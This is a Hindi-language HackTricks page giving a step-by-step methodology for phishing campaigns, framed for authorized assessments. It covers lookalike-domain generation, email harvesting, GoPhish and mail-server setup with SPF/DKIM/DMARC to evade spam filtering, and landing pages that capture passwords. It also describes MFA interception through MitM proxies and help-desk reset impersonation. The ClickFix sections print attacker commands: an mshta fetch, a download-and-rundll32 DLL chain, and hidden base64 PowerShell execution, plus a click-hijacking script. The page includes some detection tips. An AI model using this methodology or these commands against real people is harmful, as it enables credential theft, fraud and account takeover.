# Phishing Methodology

{{#include ../../banners/hacktricks-training.md}}

## Methodology

1. Victim की Recon करें
1. **victim domain** चुनें।
2. Victim द्वारा उपयोग किए जाने वाले **login portals को खोजते हुए** कुछ बुनियादी web enumeration करें और **तय करें** कि आप किसका **impersonate** करेंगे।
3. **emails खोजने** के लिए कुछ **OSINT** का उपयोग करें।
2. Environment तैयार करें
1. Phishing assessment के लिए उपयोग किए जाने वाले **domain को खरीदें**
2. **email service** से संबंधित records (SPF, DMARC, DKIM, rDNS) **configure करें**
3. VPS को **gophish** के साथ configure करें
3. Campaign तैयार करें
1. **email template** तैयार करें
2. Credentials चुराने के लिए **web page** तैयार करें
4. Campaign launch करें!

## समान domain names generate करें या trusted domain खरीदें

### Domain Name Variation Techniques

- **Keyword**: Domain name में original domain का कोई महत्वपूर्ण **keyword शामिल होता है** (जैसे, zelster.com-management.com)।<sup>[[1]](#references)</sup>
- **hypened subdomain**: Subdomain के **dot को hyphen से बदलें** (जैसे, www-zelster.com)।
- **New TLD**: **नए TLD** का उपयोग करने वाला वही domain (जैसे, zelster.org)
- **Homoglyph**: Domain name के किसी letter को **समान दिखने वाले letters से बदलता है** (जैसे, zelfser.com)।


{{#ref}}
homograph-attacks.md
{{#endref}}
- **Transposition:** Domain name के अंदर **दो letters की जगह बदलता है** (जैसे, zelsetr.com)।
- **Singularization/Pluralization**: Domain name के अंत में “s” जोड़ता या हटाता है (जैसे, zeltsers.com)।
- **Omission**: Domain name से एक letter **हटा देता है** (जैसे, zelser.com)।
- **Repetition:** किसी एक letter को **दोहराता है** (जैसे, zeltsser.com)।
- **Replacement**: Homoglyph जैसा, लेकिन कम stealthy। यह domain name के किसी letter को बदलता है, संभवतः keyboard पर original letter के पास वाले letter से (जैसे, zektser.com)।
- **Subdomained**: Domain name के अंदर एक **dot डालता है** (जैसे, ze.lster.com)।
- **Insertion**: Domain name में एक letter **डालता है** (जैसे, zerltser.com)।
- **Missing dot**: TLD को domain name के अंत में जोड़ें (जैसे, zelstercom.com)

**Automatic Tools**

- [**dnstwist**](https://github.com/elceef/dnstwist)
- [**urlcrazy**](https://github.com/urbanadventurer/urlcrazy)

**Websites**

- [https://dnstwist.it/](https://dnstwist.it)
- [https://dnstwister.report/](https://dnstwister.report)
- [https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/](https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/)

### Bitflipping

यह **संभावना होती है कि stored या communication में मौजूद कुछ bits विभिन्न कारकों**, जैसे solar flares, cosmic rays या hardware errors के कारण **अपने-आप flip हो जाएं**।

जब इस concept को **DNS requests पर लागू किया जाता है**, तो संभव है कि **DNS server द्वारा प्राप्त domain** शुरुआत में requested domain के समान न हो।

उदाहरण के लिए, "windows.com" domain में एक single bit modification इसे "windnws.com" में बदल सकता है।

Attackers **कई bit-flipping domains register करके इसका लाभ उठा सकते हैं**, जो victim के domain के समान होते हैं। उनका उद्देश्य legitimate users को अपने infrastructure पर redirect करना होता है।

अधिक जानकारी के लिए [https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/)<sup>[[9]](#references)</sup> पढ़ें।

### Trusted domain खरीदें

आप [https://www.expireddomains.net/](https://www.expireddomains.net) पर ऐसा expired domain खोज सकते हैं जिसका आप उपयोग कर सकें।\
यह सुनिश्चित करने के लिए कि आप जो expired domain खरीदने वाले हैं **उसका SEO पहले से अच्छा है**, आप यह देख सकते हैं कि इसे निम्नलिखित में कैसे categorize किया गया है:

- [http://www.fortiguard.com/webfilter](http://www.fortiguard.com/webfilter)
- [https://urlfiltering.paloaltonetworks.com/query/](https://urlfiltering.paloaltonetworks.com/query/)

## Emails की खोज

- [https://github.com/laramies/theHarvester](https://github.com/laramies/theHarvester) (100% free)
- [https://phonebook.cz/](https://phonebook.cz) (100% free)
- [https://maildb.io/](https://maildb.io)
- [https://hunter.io/](https://hunter.io)
- [https://anymailfinder.com/](https://anymailfinder.com)

अधिक valid email addresses **discover करने** या पहले से discover किए गए addresses को **verify करने** के लिए आप जांच सकते हैं कि क्या victim के smtp servers पर उन्हें brute-force किया जा सकता है। [Learn how to verify/discover email address here](../../network-services-pentesting/pentesting-smtp/index.html#username-bruteforce-enumeration)।\
इसके अलावा, यह न भूलें कि यदि users अपने mails access करने के लिए **किसी web portal का उपयोग करते हैं**, तो आप जांच सकते हैं कि क्या वह **username brute force** के प्रति vulnerable है और संभव होने पर vulnerability का exploit कर सकते हैं।

## GoPhish configure करना

### Installation

आप इसे [https://github.com/gophish/gophish/releases/tag/v0.11.0](https://github.com/gophish/gophish/releases/tag/v0.11.0) से download कर सकते हैं।

इसे `/opt/gophish` के अंदर download और decompress करें तथा `/opt/gophish/gophish` execute करें।\
Output में port 3333 पर admin user के लिए password दिया जाएगा। इसलिए उस port को access करें और admin password बदलने के लिए उन credentials का उपयोग करें। आपको उस port को local पर tunnel करने की आवश्यकता हो सकती है:
```bash
ssh -L 3333:127.0.0.1:3333 <user>@<ip>
```
### कॉन्फ़िगरेशन

**TLS certificate कॉन्फ़िगरेशन**

इस step से पहले आपको वह **domain पहले ही खरीद लेना चाहिए** जिसका आप उपयोग करने वाले हैं और उसे उस **VPS के IP** पर **pointing** करना आवश्यक है, जहाँ आप **gophish** कॉन्फ़िगर कर रहे हैं।
```bash
DOMAIN="<domain>"
wget https://dl.eff.org/certbot-auto
chmod +x certbot-auto
sudo apt install snapd
sudo snap install core
sudo snap refresh core
sudo apt-get remove certbot
sudo snap install --classic certbot
sudo ln -s /snap/bin/certbot /usr/bin/certbot
certbot certonly --standalone -d "$DOMAIN"
mkdir /opt/gophish/ssl_keys
cp "/etc/letsencrypt/live/$DOMAIN/privkey.pem" /opt/gophish/ssl_keys/key.pem
cp "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" /opt/gophish/ssl_keys/key.crt​
```
**Mail configuration**

इंस्टॉल करना शुरू करें: `apt-get install postfix`

फिर निम्नलिखित files में domain जोड़ें:

- **/etc/postfix/virtual_domains**
- **/etc/postfix/transport**
- **/etc/postfix/virtual_regexp**

**/etc/postfix/main.cf** के अंदर निम्नलिखित variables की values भी बदलें:

`myhostname = <domain>`\
`mydestination = $myhostname, <domain>, localhost.com, localhost`

अंत में **`/etc/hostname`** और **`/etc/mailname`** files को अपने domain name के अनुसार बदलें और **अपने VPS को restart करें।**

अब, `mail.<domain>` का एक **DNS A record** बनाएं, जो **VPS के ip address** की ओर point करे, और `mail.<domain>` की ओर point करने वाला **DNS MX** record बनाएं।

अब email भेजकर test करते हैं:
```bash
apt install mailutils
echo "This is the body of the email" | mail -s "This is the subject line" test@email.com
```
**Gophish configuration**

gophish का execution रोकें और इसे configure करें।\
`/opt/gophish/config.json` को निम्नानुसार modify करें (https के उपयोग पर ध्यान दें):
```bash
{
"admin_server": {
"listen_url": "127.0.0.1:3333",
"use_tls": true,
"cert_path": "gophish_admin.crt",
"key_path": "gophish_admin.key"
},
"phish_server": {
"listen_url": "0.0.0.0:443",
"use_tls": true,
"cert_path": "/opt/gophish/ssl_keys/key.crt",
"key_path": "/opt/gophish/ssl_keys/key.pem"
},
"db_name": "sqlite3",
"db_path": "gophish.db",
"migrations_prefix": "db/db_",
"contact_address": "",
"logging": {
"filename": "",
"level": ""
}
}
```
**gophish service configure करें**

gophish service बनाने के लिए, ताकि इसे स्वचालित रूप से शुरू किया जा सके और service के रूप में प्रबंधित किया जा सके, आप निम्नलिखित content के साथ `/etc/init.d/gophish` file बना सकते हैं:
```bash
#!/bin/bash
# /etc/init.d/gophish
# initialization file for stop/start of gophish application server
#
# chkconfig: - 64 36
# description: stops/starts gophish application server
# processname:gophish
# config:/opt/gophish/config.json
# From https://github.com/gophish/gophish/issues/586

# define script variables

processName=Gophish
process=gophish
appDirectory=/opt/gophish
logfile=/var/log/gophish/gophish.log
errfile=/var/log/gophish/gophish.error

start() {
echo 'Starting '${processName}'...'
cd ${appDirectory}
nohup ./$process >>$logfile 2>>$errfile &
sleep 1
}

stop() {
echo 'Stopping '${processName}'...'
pid=$(/bin/pidof ${process})
kill ${pid}
sleep 1
}

status() {
pid=$(/bin/pidof ${process})
if [["$pid" != ""| "$pid" != "" ]]; then
echo ${processName}' is running...'
else
echo ${processName}' is not running...'
fi
}

case $1 in
start|stop|status) "$1" ;;
esac
```
सेवा का कॉन्फ़िगरेशन पूरा करने और इसकी जाँच करने के लिए यह करें:
```bash
mkdir /var/log/gophish
chmod +x /etc/init.d/gophish
update-rc.d gophish defaults
#Check the service
service gophish start
service gophish status
ss -l | grep "3333\|443"
service gophish stop
```
## Mail server और domain configure करना

### Wait & be legit

किसी domain की उम्र जितनी अधिक होती है, उसके spam के रूप में पकड़े जाने की संभावना उतनी ही कम होती है। इसलिए phishing assessment से पहले आपको जितना संभव हो उतना समय इंतजार करना चाहिए (कम से कम 1 सप्ताह)। इसके अलावा, यदि आप किसी प्रतिष्ठित sector के बारे में page बनाते हैं, तो प्राप्त reputation बेहतर होगी।

ध्यान दें कि भले ही आपको एक सप्ताह इंतजार करना पड़े, फिर भी आप अभी सब कुछ configure करना समाप्त कर सकते हैं।

### Reverse DNS (rDNS) record configure करना

एक rDNS (PTR) record सेट करें, जो VPS के IP address को domain name पर resolve करे।

### Sender Policy Framework (SPF) Record

आपको **नए domain के लिए SPF record configure करना होगा**। यदि आपको नहीं पता कि SPF record क्या होता है, तो [**यह page पढ़ें**](../../network-services-pentesting/pentesting-smtp/index.html#spf)।

आप अपनी SPF policy generate करने के लिए [https://www.spfwizard.net/](https://www.spfwizard.net) का उपयोग कर सकते हैं (VPS machine का IP इस्तेमाल करें)

![phishing domain के लिए SPF record generate करने का SPF Wizard form](<../../images/image (1037).png>)

यह वह content है जिसे domain के अंदर एक TXT record में सेट करना होगा:
```bash
v=spf1 mx a ip4:ip.ip.ip.ip ?all
```
### Domain-based Message Authentication, Reporting & Conformance (DMARC) Record

आपको **नए domain के लिए DMARC record configure करना होगा**। यदि आपको नहीं पता कि DMARC record क्या होता है, तो [**यह पेज पढ़ें**](../../network-services-pentesting/pentesting-smtp/index.html#dmarc)।

आपको एक नया DNS TXT record बनाना होगा, जो hostname `_dmarc.<domain>` की ओर इंगित करे और जिसमें निम्नलिखित content हो:
```bash
v=DMARC1; p=none
```
### DomainKeys Identified Mail (DKIM)

आपको **नए domain के लिए DKIM configure करना होगा**। यदि आपको नहीं पता कि DMARC record क्या होता है, तो [**यह page पढ़ें**](../../network-services-pentesting/pentesting-smtp/index.html#dkim)।

यह tutorial इस पर आधारित है: [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)<sup>[[4]](#references)</sup>

> [!TIP]
> आपको DKIM key द्वारा generate किए गए दोनों B64 values को concatenate करना होगा:
>
> ```
> v=DKIM1; h=sha256; k=rsa; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0wPibdqPtzYk81njjQCrChIcHzxOp8a1wjbsoNtka2X9QXCZs+iXkvw++QsWDtdYu3q0Ofnr0Yd/TmG/Y2bBGoEgeE+YTUG2aEgw8Xx42NLJq2D1pB2lRQPW4IxefROnXu5HfKSm7dyzML1gZ1U0pR5X4IZCH0wOPhIq326QjxJZm79E1nTh3xj" "Y9N/Dt3+fVnIbMupzXE216TdFuifKM6Tl6O/axNsbswMS1TH812euno8xRpsdXJzFlB9q3VbMkVWig4P538mHolGzudEBg563vv66U8D7uuzGYxYT4WS8NVm3QBMg0QKPWZaKp+bADLkOSB9J2nUpk4Aj9KB5swIDAQAB
> ```

### अपने email configuration score का परीक्षण करें

आप यह [https://www.mail-tester.com/](https://www.mail-tester.com) का उपयोग करके कर सकते हैं\
बस page खोलें और उनके द्वारा दिए गए address पर एक email भेजें:
```bash
echo "This is the body of the email" | mail -s "This is the subject line" test-iimosa79z@srv1.mail-tester.com
```
आप `check-auth@verifier.port25.com` पर email भेजकर और **response पढ़कर** अपनी **email configuration भी जांच** सकते हैं (इसके लिए आपको port **25** **open** करना होगा और यदि आप email root के रूप में भेजते हैं, तो response फ़ाइल _/var/mail/root_ में देखना होगा)।\
जांचें कि आप सभी tests पास करते हैं:
```bash
==========================================================
Summary of Results
==========================================================
SPF check:          pass
DomainKeys check:   neutral
DKIM check:         pass
Sender-ID check:    pass
SpamAssassin check: ham
```
आप अपने नियंत्रण वाले Gmail पर **message भी भेज सकते हैं**, और अपने Gmail inbox में **email के headers** जाँच सकते हैं; `dkim=pass` `Authentication-Results` header field में मौजूद होना चाहिए।
```
Authentication-Results: mx.google.com;
spf=pass (google.com: domain of contact@example.com designates --- as permitted sender) smtp.mail=contact@example.com;
dkim=pass header.i=@example.com;
```
### Spamhouse Blacklist से हटाना

पेज [www.mail-tester.com](https://www.mail-tester.com) आपको बता सकता है कि आपका domain spamhouse द्वारा block किया जा रहा है या नहीं। आप अपने domain/IP को यहां से हटाने का अनुरोध कर सकते हैं: ​[https://www.spamhaus.org/lookup/](https://www.spamhaus.org/lookup/)

### Microsoft Blacklist से हटाना

​​आप अपने domain/IP को [https://sender.office.com/](https://sender.office.com) से हटाने का अनुरोध कर सकते हैं।

## GoPhish Campaign बनाना और Launch करना

### Sending Profile

- sender profile की पहचान के लिए कोई **name सेट करें**
- तय करें कि आप किस account से phishing emails भेजने वाले हैं। सुझाव: _noreply, support, servicedesk, salesforce..._
- आप username और password को blank छोड़ सकते हैं, लेकिन **Ignore Certificate Errors** को check करना सुनिश्चित करें

![GoPhish Campaign बनाना और Launch करना - Sending Profile: आप username और password को blank छोड़ सकते हैं, लेकिन Ignore Certificate Errors को check करना सुनिश्चित करें](<../../images/image (253) (1) (2) (1) (1) (2) (2) (3) (3) (5) (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (10) (15) (2).png>)

> [!TIP]
> यह जांचने के लिए कि सब कुछ सही तरीके से काम कर रहा है, "**Send Test Email**" functionality का उपयोग करने की सलाह दी जाती है।\
> मैं tests के लिए **10min mail addresses** पर test emails भेजने की सलाह दूंगा, ताकि blacklisted होने से बचा जा सके।

### Email Template

- template की पहचान के लिए कोई **name सेट करें**
- फिर एक **subject** लिखें (कुछ अजीब नहीं, बस ऐसा कुछ जिसे आप किसी regular email में पढ़ने की उम्मीद कर सकते हैं)
- सुनिश्चित करें कि आपने "**Add Tracking Image**" को check किया है
- **email template** लिखें (आप निम्नलिखित उदाहरण की तरह variables का उपयोग कर सकते हैं):
```html
<html>
<head>
<title></title>
</head>
<body>
<p class="MsoNormal"><span style="font-size:10.0pt;font-family:&quot;Verdana&quot;,sans-serif;color:black">Dear {{.FirstName}} {{.LastName}},</span></p>
<br />
Note: We require all user to login an a very suspicios page before the end of the week, thanks!<br />
<br />
Regards,</span></p>

WRITE HERE SOME SIGNATURE OF SOMEONE FROM THE COMPANY

<p>{{.Tracker}}</p>
</body>
</html>
```
ध्यान दें कि **ईमेल की विश्वसनीयता बढ़ाने के लिए**, क्लाइंट के किसी ईमेल से signature का उपयोग करने की सलाह दी जाती है। सुझाव:

- किसी **मौजूद न होने वाले पते** पर ईमेल भेजें और देखें कि response में कोई signature है या नहीं।
- **public emails** जैसे info@ex.com या press@ex.com या public@ex.com खोजें और उन्हें ईमेल भेजकर response की प्रतीक्षा करें।
- किसी **मान्य रूप से खोजे गए** ईमेल से संपर्क करने का प्रयास करें और response की प्रतीक्षा करें।

![Sending Profile - Email Template: Try to contact some valid discovered email and wait for the response](<../../images/image (80).png>)

> [!TIP]
> Email Template आपको **भेजने के लिए files attach करने** की भी अनुमति देता है। यदि आप specially crafted files/documents का उपयोग करके NTLM challenges भी steal करना चाहते हैं, तो [इस पेज को पढ़ें](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md)।

### Landing Page

- एक **name** लिखें
- वेब पेज का **HTML code लिखें**। ध्यान दें कि आप वेब पेज **import** कर सकते हैं।
- **Capture Submitted Data** और **Capture Passwords** को mark करें
- एक **redirection** सेट करें

![Email Template - Landing Page: Mark Capture Submitted Data and Capture Passwords](<../../images/image (826).png>)

> [!TIP]
> आमतौर पर आपको पेज के HTML code को modify करना होगा और local में कुछ tests करने होंगे (शायद किसी Apache server का उपयोग करके), **जब तक आपको results पसंद न आ जाएं।** इसके बाद उस HTML code को box में लिखें।\
> ध्यान दें कि यदि आपको HTML के लिए कुछ **static resources** (शायद कुछ CSS और JS pages) **use करने हैं**, तो आप उन्हें _**/opt/gophish/static/endpoint**_ में save कर सकते हैं और फिर _**/static/\<filename>**_ से access कर सकते हैं।

> [!TIP]
> Redirection के लिए आप **users को victim के legit main web page पर redirect कर सकते हैं**, या उदाहरण के लिए उन्हें _/static/migration.html_ पर redirect कर सकते हैं, वहां 5 सेकंड के लिए कुछ **spinning wheel (**[**https://loading.io/**](https://loading.io)**) लगाएं और फिर indicate करें कि process successful था**।

### Users & Groups

- एक name सेट करें
- **data import करें** (ध्यान दें कि example के लिए template use करने हेतु आपको प्रत्येक user का firstname, last name और email address चाहिए)

![Landing Page - Users & Groups: Import the data (note that in order to use the template for the example you need the firstname, last name and email address of each user)](<../../images/image (163).png>)

### Campaign

अंत में, एक name, email template, landing page, URL, sending profile और group select करके campaign create करें। ध्यान दें कि URL victims को भेजा जाने वाला link होगा।

ध्यान दें कि **Sending Profile एक test email भेजने की अनुमति देता है, ताकि देखा जा सके कि final phishing email कैसा दिखाई देगा**:

![Users & Groups - Campaign: Note that the Sending Profile allow to send a test email to see how will the final phishing email looks like](<../../images/image (192).png>)

> [!TIP]
> मैं test emails **10min mails addresses पर भेजने** की सलाह दूंगा, ताकि tests के कारण blacklisted होने से बचा जा सके।

सब कुछ तैयार होने के बाद campaign launch करें!

## Website Cloning

यदि किसी कारण से आप वेबसाइट clone करना चाहते हैं, तो निम्नलिखित पेज देखें:


{{#ref}}
clone-a-website.md
{{#endref}}

## Backdoored Documents & Files

कुछ phishing assessments (मुख्यतः Red Teams के लिए) में आप **किसी प्रकार के backdoor वाली files भी भेजना चाहेंगे** (शायद कोई C2 या केवल ऐसा कुछ जो authentication trigger करे)।\
कुछ examples के लिए निम्नलिखित पेज देखें:


{{#ref}}
phishing-documents.md
{{#endref}}

## Phishing MFA

### Via Proxy MitM

पिछला attack काफी clever है, क्योंकि आप एक real website को fake करके user द्वारा दर्ज की गई information collect करते हैं। दुर्भाग्य से, यदि user ने सही password दर्ज नहीं किया या आपके द्वारा fake किया गया application 2FA के साथ configured है, तो **यह information आपको tricked user का impersonate करने की अनुमति नहीं देगी**।

यहीं [**evilginx2**](https://github.com/kgretzky/evilginx2)**,** [**CredSniper**](https://github.com/ustayready/CredSniper) और [**muraena**](https://github.com/muraenateam/muraena) जैसे tools उपयोगी हैं। यह tool आपको MitM जैसा attack generate करने की अनुमति देगा। मूल रूप से, attack निम्नलिखित तरीके से काम करता है:

1. आप real webpage के **login** form का **impersonate** करते हैं।
2. User अपने **credentials** आपके fake page पर **send** करता है और tool उन्हें real webpage पर send करता है, तथा **credentials के काम करने की जांच करता है**।
3. यदि account  **2FA** के साथ configured है, तो MitM page इसे मांगेगा और जैसे ही **user इसे enter करता है**, tool इसे real web page पर send कर देगा।
4. User के authenticated होने के बाद, आप (attacker के रूप में) MitM perform करते समय होने वाले हर interaction के **credentials, 2FA, cookie और किसी भी information को capture** कर चुके होंगे।

### Via VNC

यदि **victim को original जैसी दिखने वाली malicious page पर भेजने** के बजाय, आप उसे **real web page से connected browser वाले VNC session में भेजें**, तो क्या होगा? आप देख सकेंगे कि वह क्या करता है, password, उपयोग किया गया MFA, cookies आदि steal कर सकेंगे...\
आप यह [**EvilnVNC**](https://github.com/JoelGMSec/EvilnoVNC)<sup>[[3]](#references)</sup> से कर सकते हैं।

## detection का पता लगाना

यह जानने के सर्वोत्तम तरीकों में से एक कि आप पकड़े गए हैं या नहीं, **अपने domain को blacklists में search करना** है। यदि वह listed दिखाई देता है, तो किसी तरह आपका domain suspicious के रूप में detect किया गया है।\
यह check करने का एक आसान तरीका कि आपका domain किसी blacklist में दिखाई देता है या नहीं, [https://malwareworld.com/](https://malwareworld.com) का उपयोग करना है।

हालांकि, यह जानने के अन्य तरीके भी हैं कि victim **actively wild में suspicious phishing activity खोज रहा है या नहीं**, जैसा कि यहां बताया गया है:


{{#ref}}
detecting-phising.md
{{#endref}}

आप **victim के domain के समान नाम वाला domain खरीद सकते हैं** और/या अपने नियंत्रण वाले domain के **subdomain** के लिए ऐसा certificate **generate कर सकते हैं**, जिसमें victim के domain का **keyword** शामिल हो। यदि **victim** उनके साथ किसी प्रकार का **DNS या HTTP interaction** करता है, तो आपको पता चल जाएगा कि **वह suspicious domains को actively खोज रहा है**, और आपको बहुत stealthy रहना होगा।<sup>[[2]](#references)</sup>

### phishing का मूल्यांकन

यह evaluate करने के लिए कि आपका email spam folder में जाएगा या block होगा अथवा successful रहेगा, [**Phishious** ](https://github.com/Rices/Phishious)का उपयोग करें।

## High-Touch Identity Compromise (Help-Desk MFA Reset)

Modern intrusion sets तेजी से email lures को पूरी तरह छोड़कर **MFA को defeat करने के लिए सीधे service-desk / identity-recovery workflow को target** कर रहे हैं। Attack पूरी तरह "living-off-the-land" है: एक बार operator के पास valid credentials आ जाने पर, वह built-in admin tooling के साथ pivot करता है – किसी malware की आवश्यकता नहीं होती।<sup>[[5]](#references)</sup>

### Attack flow
1. Victim की reconnaissance करें
* LinkedIn, data breaches, public GitHub आदि से personal और corporate details harvest करें।
* High-value identities (executives, IT, finance) identify करें और password / MFA reset के **exact help-desk process** को enumerate करें।
2. Real-time social engineering
* Target का impersonate करते हुए help-desk को phone, Teams या chat करें (अक्सर **spoofed caller-ID** या **cloned voice** के साथ)।
* Knowledge-based verification पार करने के लिए पहले से collect की गई PII प्रदान करें।
* Agent को **MFA secret reset** करने या registered mobile number पर **SIM-swap** करने के लिए convince करें।
3. Immediate post-access actions (वास्तविक मामलों में ≤60 min)
* किसी भी web SSO portal के माध्यम से foothold स्थापित करें।
* Built-ins से AD / AzureAD enumerate करें (कोई binaries drop न करें):
```powershell
# list directory groups & privileged roles
Get-ADGroup -Filter * -Properties Members | ?{$_.Members -match $env:USERNAME}

# AzureAD / Graph – list directory roles
Get-MgDirectoryRole | ft DisplayName,Id

# Enumerate devices the account can login to
Get-MgUserRegisteredDevice -UserId <user@corp.local>
```
* Environment में पहले से whitelisted **WMI**, **PsExec**, या legitimate **RMM** agents के साथ lateral movement करें।

### Detection & Mitigation
* Help-desk identity recovery को **privileged operation** मानें – step-up auth और manager approval आवश्यक करें।
* **Identity Threat Detection & Response (ITDR)** / **UEBA** rules deploy करें, जो निम्नलिखित पर alert करें:
* MFA method change + नए device / geo से authentication।
* उसी principal का immediate elevation (user-→-admin)।
* Help-desk calls record करें और किसी भी reset से पहले **पहले से registered number पर call-back** अनिवार्य करें।
* **Just-In-Time (JIT) / Privileged Access** implement करें, ताकि newly reset accounts को high-privilege tokens स्वतः inherit न हों।

---

## At-Scale Deception – SEO Poisoning & “ClickFix” Campaigns
Commodity crews high-touch ops की लागत को mass attacks से offset करते हैं, जो **search engines और ad networks को delivery channel में बदल देते हैं**।<sup>[[5]](#references)</sup>

1. **SEO poisoning / malvertising** किसी fake result, जैसे `chromium-update[.]site`, को top search ads पर push करता है।
2. Victim एक छोटा **first-stage loader** (अक्सर JS/HTA/ISO) download करता है। Unit 42 द्वारा देखे गए examples:
* `RedLine stealer`
* `Lumma stealer`
* `Lampion Trojan`
3. Loader browser cookies और credential DBs exfiltrate करता है, फिर एक **silent loader** pull करता है, जो *realtime* में तय करता है कि क्या deploy करना है:
* RAT (जैसे AsyncRAT, RustDesk)
* ransomware / wiper
* persistence component (registry Run key + scheduled task)

### Hardening tips
* Newly-registered domains को block करें और e-mail के साथ-साथ **search-ads** पर भी **Advanced DNS / URL Filtering** लागू करें।
* Software installation को signed MSI / Store packages तक सीमित करें और policy के अनुसार `HTA`, `ISO`, `VBS` execution deny करें।
* Browsers द्वारा installers खोलने वाली child processes को monitor करें:
```yaml
- parent_image: /Program Files/Google/Chrome/*
and child_image: *\\*.exe
```
* First-stage loaders द्वारा अक्सर abuse किए जाने वाले LOLBins (जैसे `regsvr32`, `curl`, `mshta`) के लिए hunt करें।

### Download-button click hijacking with TDS handoff
कुछ fake software portals visible download `href` को **real GitHub/release URL** पर point करते हैं, लेकिन JavaScript में user के **पहले interaction** को hijack करके victim को इसके बजाय **Traffic Distribution System (TDS)** chain में भेजते हैं।<sup>[[8]](#references)</sup>
```javascript
const cachedOpen = window.open;
document.addEventListener(isChromeDesktop() ? "mousedown" : "click", (e) => {
if (!isEligibleClick(e.target)) return;
cachedOpen(generateRuntimeURL({referrer: location.href, userDestination: extractClickedLink(e.target)}));
e.stopImmediatePropagation();
e.preventDefault();
}, true);
```
Key traits:
- Hook आमतौर पर `document` पर **capture phase** (`true`) में चलता है, इसलिए यह site handlers से पहले execute होता है।
- Chrome अक्सर `click` के बजाय `mousedown` का उपयोग करता है, ताकि redirect एक मान्य **user gesture** से जुड़ा रहे और popup-blocker bypass बेहतर हो।
- कुछ variants पहले से `about:blank` खोलते हैं या `<a target="_blank">` clicks को synthesize करते हैं और केवल बाद में TDS URL assign करते हैं।
- Browser-side caps आमतौर पर `localStorage` में रहते हैं, इसलिए **first click** malware तक पहुंच सकता है, जबकि refreshes/retries benign-looking visible link पर वापस जा सकते हैं।
- TDS referrer, entry domain, GEO, browser/device fingerprint, VPN/datacenter checks, click context और per-session counters के आधार पर access को gate कर सकता है, जिससे analyst replays non-deterministic हो जाते हैं।

Defender ideas:
- Click के समय generated **actual** navigation target की तुलना **displayed** `href` से करें।
- ऐसे `document.addEventListener(..., true)` handlers की तलाश करें जो `window.open`, `about:blank` या synthetic anchor clicks के आसपास `preventDefault()` और `stopImmediatePropagation()` दोनों call करते हों।
- नए registered software-download domains के उन clusters को high-signal SEO-poisoning/TDS pattern मानें, जो सभी एक ही CloudFront/JS stage load करते हैं।

### ClickFix from fake verification pages + archive-looking LOLBAS fetches
कुछ TDS branches एक fake verification page पर समाप्त होते हैं, जो Cloudflare/IUAM style का होता है और victim को किसी trusted Windows binary को run करने के लिए कहता है:<sup>[[8]](#references)</sup>
```cmd
C:\Windows\SysWOW64\mshta.exe https://example[.]com/navy.7z
```
Notes:
- `mshta.exe` response की शुरुआत में मौजूद **HTA/VBScript को execute करता है**, भले ही URL `.7z` archive होने का दिखावा करे; जोड़ा गया archive data पूरी तरह decoy हो सकता है।
- Follow-on stages अक्सर file type के बारे में झूठ बोलते रहते हैं (`.rtf` for PowerShell, `.asar` for Python, padded binaries वाली ZIPs) और फिर **manual PE mapping / in-memory execution** पर switch कर जाते हैं।
- यदि आप ऐसी किसी chain पर प्रतिक्रिया दे रहे हैं, तो **पहले सफल run से network + memory को preserve करें**: बाद के replays में केवल benign installer/SFX path दिखाई दे सकता है या payload/key release मूल TDS session से bound होने के कारण fail हो सकता है।

### ClickFix DLL delivery tradecraft (fake CERT update)
* Lure: cloned national CERT advisory, जिसमें एक **Update** button होता है और step-by-step “fix” instructions दिखाई जाती हैं। Victims को एक batch चलाने के लिए कहा जाता है, जो DLL download करके उसे `rundll32` के माध्यम से execute करता है।<sup>[[8]](#references)</sup>
* Typical batch chain observed:
```cmd
echo powershell -Command "Invoke-WebRequest -Uri 'https://example[.]org/notepad2.dll' -OutFile '%TEMP%\notepad2.dll'"
echo timeout /t 10
echo rundll32.exe "%TEMP%\notepad2.dll",notepad
```
* `Invoke-WebRequest` payload को `%TEMP%` में drop करता है, एक short sleep network jitter को छिपाती है, फिर `rundll32` exported entrypoint (`notepad`) को call करता है।
* DLL host identity को beacon करता है और हर कुछ मिनट में C2 को poll करता है। Remote tasking **base64-encoded PowerShell** के रूप में आती है, जिसे hidden और policy bypass के साथ execute किया जाता है:
```powershell
powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('<b64_task>')) | Invoke-Expression"
```
* इससे C2 flexibility बनी रहती है (server DLL को update किए बिना tasks बदल सकता है) और console windows छिपी रहती हैं। `-WindowStyle Hidden` + `FromBase64String` + `Invoke-Expression` का एक साथ उपयोग करने वाले `rundll32.exe` के PowerShell children की तलाश करें।
* Defenders `%COMPUTER%sss%USER` के रूप में `...page.php?tynor=<COMPUTER>sss<USER>` वाले HTTP(S) callbacks और DLL load होने के बाद 5-minute polling intervals की तलाश कर सकते हैं।

---

## AI-Enhanced Phishing Operations
Attackers अब पूरी तरह personalised lures और real-time interaction के लिए **LLM & voice-clone APIs** को chain करते हैं।

| Layer | Threat actor द्वारा example use |
|-------|-------------|
|Automation|Randomised wording और tracking links के साथ >100 k emails / SMS generate और send करना।|
|Generative AI|*One-off* emails तैयार करना, जिनमें public M&A और social media से लिए गए inside jokes का उल्लेख हो; callback scam में deep-fake CEO voice का उपयोग।|
|Agentic AI|Domains को autonomously register करना, open-source intel scrape करना, और victim के click करने लेकिन creds submit न करने पर next-stage mails तैयार करना।|

**Defence:**
• Untrusted automation से भेजे गए messages को highlight करने वाले **dynamic banners** जोड़ें (ARC/DKIM anomalies के माध्यम से)।
• High-risk phone requests के लिए **voice-biometric challenge phrases** deploy करें।
• Awareness programmes में AI-generated lures को लगातार simulate करें – static templates obsolete हो चुके हैं।

